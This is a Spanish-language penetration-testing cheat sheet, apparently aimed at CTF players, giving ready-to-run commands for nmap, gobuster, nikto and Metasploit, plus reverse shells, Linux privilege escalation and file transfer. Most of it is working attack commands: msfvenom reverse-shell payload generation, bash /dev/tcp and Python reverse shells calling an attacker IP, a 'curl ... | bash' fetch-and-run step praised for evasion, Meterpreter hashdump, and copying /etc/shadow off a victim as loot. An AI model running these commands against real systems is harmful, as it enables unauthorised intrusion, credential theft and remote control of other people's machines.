NMAP — Network Mapper
Ping Scan (Host Discovery) PASIVO 
$ nmap -sn 192.168.1.0/24
¿Qué hace?
Envía pings a toda una red para descubrir qué hosts (máquinas) están encendidos y responden. NO escanea puertos aún — solo comprueba quién existe en la red.
discoverypingred-local
Escaneo de Puertos Básico BÁSICO 
$ nmap -sV -sC -p- 10.10.10.1
¿Qué hace?
-sV detecta qué software y versión corre en cada puerto. -sC ejecuta scripts automáticos de detección. -p- escanea los 65535 puertos (no solo los 1000 más comunes).
portsversionescompleto
Escaneo Agresivo (T4) AGRESIVO 
$ nmap -A -T4 -p 22,80,443 10.10.10.1
¿Qué hace?
-A activa detección de OS, versiones, scripts y traceroute todo a la vez. -T4 lo hace a máxima velocidad (puede disparar alertas IDS).
agresivoos-detectionrápido
Escaneo Stealth (SYN) SILENCIOSO 
$ nmap -sS -T2 -O 10.10.10.1
¿Qué hace?
-sS hace un "half-open scan": abre conexiones TCP sin completarlas, siendo más difícil de detectar. -T2 va más lento para evadir detección. -O intenta adivinar el sistema operativo.
stealthsyn-scanevasión
Guardar Resultados ÚTIL 
$ nmap -sV 10.10.10.1 -oN resultado.txt
$ nmap -sV 10.10.10.1 -oX resultado.xml
¿Qué hace?
Guarda el resultado del escaneo en un archivo. -oN en formato legible por humanos, -oX en XML (útil para importar a otras herramientas como Metasploit).
outputreportes
Script de Vulnerabilidades INTRUSIVO 
$ nmap --script vuln 10.10.10.1
$ nmap --script http-sql-injection 10.10.10.1
¿Qué hace?
Ejecuta la librería NSE (Nmap Scripting Engine) con scripts de detección de vulnerabilidades conocidas. Puede detectar EternalBlue, Heartbleed, SQLi y más de forma automática.
NSEvulnscriptcve

GOBUSTER — Directory Brute Force
Gobuster — Directorios Básico ENUMERACIÓN 
$ gobuster dir -u http://10.10.10.1 -w /usr/share/wordlists/dirb/common.txt
¿Qué hace?
Prueba miles de nombres de directorios y archivos en el servidor web usando una "wordlist". Si el servidor responde con código 200, ese directorio existe. Busca cosas como /admin, /backup, /login.
fuzzingdirectorioswordlist
Gobuster — Con Extensiones ARCHIVOS 
$ gobuster dir -u http://10.10.10.1 \
  -w /usr/share/wordlists/dirbuster/medium.txt \
  -x php,txt,html,bak -t 50
¿Qué hace?
-x añade extensiones para buscar archivos específicos (busca admin.php, login.txt, config.bak...). -t 50 usa 50 hilos paralelos para ir más rápido.
extensionesarchivosmulti-thread
Gobuster — Subdominios (DNS) DNS 
$ gobuster dns -d example.com \
  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
¿Qué hace?
Busca subdominios ocultos del objetivo (api.example.com, dev.example.com, staging.example.com...). A veces los subdominios tienen acceso a recursos internos o paneles de administración.
DNSsubdominiosSecLists
NIKTO — Escáner de Vulnerabilidades Web
Nikto — Escaneo Básico INTRUSIVO 
$ nikto -h http://10.10.10.1
¿Qué hace?
Analiza el servidor web en busca de más de 6700 vulnerabilidades conocidas: archivos peligrosos expuestos, configuraciones incorrectas, versiones de software vulnerables, cabeceras de seguridad faltantes y mucho más.
vulnsheadersmisconfig
Nikto — Con Puerto y SSL INTRUSIVO 
$ nikto -h https://10.10.10.1 -p 8443 -ssl
$ nikto -h http://10.10.10.1 -o nikto_output.html
¿Qué hace?
-p especifica un puerto no estándar. -ssl fuerza HTTPS. -o guarda el resultado en un reporte HTML muy legible. Ideal para documentar findings.
SSLreportepuerto-custom

METASPLOIT FRAMEWORK
Iniciar Metasploit SETUP 
$ msfconsole
msf6 > search eternalblue
msf6 > use 0
¿Qué hace?
Lanza la consola de Metasploit. search busca exploits por nombre o CVE. use 0 selecciona el primer resultado de la búsqueda. Piensa en Metasploit como una "navaja suiza" de exploits ya listos.
MSFframeworkinicio
Configurar y Lanzar Exploit EXPLOIT 
msf6 > show options
msf6 > set RHOSTS 10.10.10.1
msf6 > set LHOST 10.9.0.1
msf6 > set LPORT 4444
msf6 > run
¿Qué hace?
RHOSTS = IP del objetivo (victim). LHOST = tu IP (atacante). LPORT = puerto donde escucharás. run lanza el exploit. Cuando funciona, obtienes una sesión shell o Meterpreter.
RHOSTSLHOSTpayload
Meterpreter — Comandos Clave POST-EXPLOIT 
meterpreter > sysinfo
meterpreter > getuid
meterpreter > shell
meterpreter > download /etc/passwd
meterpreter > hashdump
¿Qué hace?
sysinfo: info del sistema. getuid: qué usuario eres. shell: obtén una cmd/bash. download: descarga archivo del objetivo. hashdump: vuelca hashes de contraseñas (Windows).
meterpreterpost-exploitpivoting
Generar Payload con msfvenom PAYLOAD 
$ msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=10.9.0.1 LPORT=4444 \
  -f elf -o payload.elf
¿Qué hace?
Genera un ejecutable malicioso (payload) que, al ejecutarse en la víctima, se conecta de vuelta a tu máquina (reverse shell). -f elf para Linux, usa exe para Windows, apk para Android.
msfvenompayloadreverse-tcp
REVERSE SHELLS — Netcat & Bash
Netcat — Escuchar (Atacante) LISTENER 
$ nc -lvnp 4444
# También con rlwrap para mejor UX:
$ rlwrap nc -lvnp 4444
¿Qué hace?
Pone tu máquina en "modo escucha" esperando que alguien se conecte al puerto 4444. -l escucha, -v modo verbose, -n sin DNS, -p puerto. Cuando la víctima ejecuta la reverse shell, aparece una conexión aquí.
netcatlistenernc
Bash Reverse Shell (Víctima) REVERSE SHELL 
$ bash -i >& /dev/tcp/10.9.0.1/4444 0>&1
¿Qué hace?
Ejecutado en la máquina víctima, abre una bash interactiva (-i) y redirige su entrada/salida hacia tu IP y puerto. En esencia: "la máquina víctima llama a tu máquina y te da su terminal".
bashreverse-shelllinux
Python Reverse Shell REVERSE SHELL 
$ python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.9.0.1",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
¿Qué hace?
Reverse shell en Python, útil cuando bash no está disponible o está restringida. Crea un socket TCP, se conecta al atacante y redirige stdin/stdout/stderr. pty.spawn da una shell TTY completa.
python3ptytty
Mejorar Shell (TTY Completa) POST-SHELL 
# En la shell recibida:
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
$ export TERM=xterm
# Ctrl+Z  →  background shell
$ stty raw -echo; fg
¿Qué hace?
Las reverse shells básicas son "tontas" (sin autocompletado, sin Ctrl+C). Estos comandos las "mejoran" a una TTY completa donde funcionan los comandos interactivos (vim, su, ssh, etc.) y el historial.
TTYsttyupgrade

PRIVILEGE ESCALATION
// De usuario normal a root — Escalada de privilegios Linux
ENUMERACIÓN DEL SISTEMA
Info Básica del Sistema RECONOCIMIENTO 
$ id && whoami
$ uname -a
$ cat /etc/os-release
$ cat /etc/passwd | grep -v nologin
¿Qué hace?
id: muestra tu usuario y grupos actuales. uname -a: versión del kernel (puede tener exploits públicos). passwd: lista usuarios del sistema (busca cuentas interesantes).
enumkernelusuarios
Permisos SUDO PRIVESC 
$ sudo -l
$ sudo -u#-1 /bin/bash
$ sudo /bin/bash
¿Qué hace?
sudo -l muestra qué comandos puedes ejecutar como root. Si ves algo como (ALL) NOPASSWD: /bin/vim, puedes usarlo para escalar a root. Consulta GTFOBins para saber cómo abusar de cada binario.
sudoGTFOBinsNOPASSWD
Buscar Archivos SUID SUID 
$ find / -perm -4000 -type f 2>/dev/null
$ find / -perm -u=s -type f 2>/dev/null
¿Qué hace?
Busca en todo el sistema archivos con el bit SUID activado. Un archivo SUID se ejecuta con los permisos de su propietario (normalmente root), aunque lo lance un usuario sin privilegios. 2>/dev/null oculta los errores de permiso.
SUIDfindroot
Cron Jobs y Tareas Programadas CRON 
$ cat /etc/crontab
$ crontab -l
$ ls -la /etc/cron*
$ cat /var/spool/cron/crontabs/*
¿Qué hace?
Muestra las tareas programadas del sistema. Si hay un script ejecutado por root con permisos de escritura para tu usuario, puedes modificarlo para que ejecute tu código como root la próxima vez que corra.
cronscheduledwildcard
Archivos con Contraseñas PASSWORDS 
$ find / -name "*.conf" 2>/dev/null | xargs grep -l "password"
$ find / -name "*.txt" 2>/dev/null | xargs grep -il "pass"
$ history
¿Qué hace?
Busca en archivos de configuración y texto palabras clave como "password". Es sorprendente cuántas veces hay contraseñas hardcodeadas en configs. history revisa comandos ejecutados anteriormente — muchas veces contienen credenciales.
passwordsgrepconfig
LinPEAS / LinEnum (Auto-Enum) AUTOMÁTICO 
# Descargar y ejecutar LinPEAS:
$ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
# O transferirlo y ejecutarlo:
$ chmod +x linpeas.sh && ./linpeas.sh
¿Qué hace?
LinPEAS es el script de enumeración automática más usado en CTFs. Comprueba automáticamente cientos de vectores de escalada de privilegios y colorea los hallazgos por peligrosidad. Lo que es rojo/amarillo, examínalo primero.
LinPEASPEASSautomático

TRANSFERENCIA DE ARCHIVOS
// Mover herramientas y datos entre máquinas
PYTHON HTTP SERVER
Servidor HTTP Instantáneo SERVIDOR 
# En tu máquina (atacante) — comparte el directorio actual:
$ python3 -m http.server 8080
# Python 2 (legacy):
$ python -m SimpleHTTPServer 8080
¿Qué hace?
Levanta un servidor web en tu máquina que sirve todos los archivos del directorio actual. Desde la víctima puedes descargarte herramientas (LinPEAS, exploits) con wget o curl.
pythonhttpservidor
Descargar desde la Víctima DESCARGA 
# En la máquina víctima:
$ wget http://10.9.0.1:8080/linpeas.sh
$ curl -O http://10.9.0.1:8080/exploit.py
$ curl http://10.9.0.1:8080/shell.sh | bash
¿Qué hace?
Descarga archivos desde tu servidor HTTP a la máquina víctima. wget y curl -O guardan el archivo. El último ejemplo ejecuta el script directamente sin guardarlo en disco (útil para evasión).
wgetcurldescarga
SCP — Secure Copy Protocol
SCP — Subir Archivo al Objetivo UPLOAD 
# Desde tu máquina → a la víctima:
$ scp linpeas.sh usuario@10.10.10.1:/tmp/
# Con clave SSH:
$ scp -i id_rsa archivo.sh usuario@10.10.10.1:/tmp/
¿Qué hace?
Copia un archivo de tu máquina a la víctima de forma segura por SSH. Necesitas credenciales SSH válidas. La sintaxis es scp [origen] [usuario@ip:/destino]. Muy útil cuando tienes SSH pero no HTTP.
SCPSSHupload
SCP — Descargar Archivo de la Víctima DOWNLOAD 
# De la víctima → a tu máquina local:
$ scp usuario@10.10.10.1:/etc/shadow ./shadow_copia
# Descargar directorio completo (-r):
$ scp -r usuario@10.10.10.1:/opt/backups/ ./loot/
¿Qué hace?
Descarga archivos de la víctima a tu máquina local. Útil para extraer "loot" (datos encontrados): contraseñas, configs, llaves SSH... -r descarga carpetas enteras recursivamente.
SCPlootexfiltración
Netcat — Transferencia de Archivos NETCAT 
# Receptor (víctima) escucha:
$ nc -lvnp 9999 > archivo_recibido.sh
# Emisor (atacante) envía:
$ nc 10.10.10.1 9999 < linpeas.sh
¿Qué hace?
Transfiere archivos usando Netcat cuando no hay SSH ni HTTP. El receptor escucha en un puerto y redirige lo que llega a un archivo. El emisor abre una conexión y envía el contenido del archivo. Rápido y sin autenticación.
netcatno-authrápido
Base64 — Transferencia sin Red ENCODE 
# Codificar en atacante:
$ base64 linpeas.sh > linpeas.b64
# Pegar el texto b64 en víctima y decodificar:
$ echo "BASE64_DATA" | base64 -d > linpeas.sh
$ chmod +x linpeas.sh
¿Qué hace?
Convierte un archivo binario/script a texto Base64, que puedes copiar-pegar directamente en la terminal de la víctima. Útil cuando no tienes conexión directa pero sí un webshell o consola limitada. No necesita red adicional.
base64encodewebshell
